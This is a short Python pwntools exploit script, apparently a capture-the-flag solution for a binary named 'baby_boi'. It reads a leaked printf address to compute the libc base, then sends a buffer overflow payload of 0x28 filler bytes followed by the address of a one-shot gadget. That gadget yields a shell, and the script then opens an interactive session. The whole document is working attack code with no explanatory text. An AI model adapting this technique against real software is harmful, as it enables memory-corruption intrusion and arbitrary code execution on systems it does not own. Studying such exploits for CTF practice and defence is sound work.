from pwn import *

# Establish the target
target = process('./baby_boi')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(target)

print(target.recvuntil(b"ere I am: "))

# Scan in the infoleak
leak = target.recvline()
leak = leak.strip(b"\n")

base = int(leak, 16) - libc.symbols['printf']

print("wooo:" + hex(base))

# Calculate oneshot gadget
oneshot = base + 0x50a37

payload = b""
payload += b"0"*0x28         # Offset to oneshot gadget
payload += p64(oneshot)     # Oneshot gadget

# Send the payload
target.sendline(payload)

target.interactive()
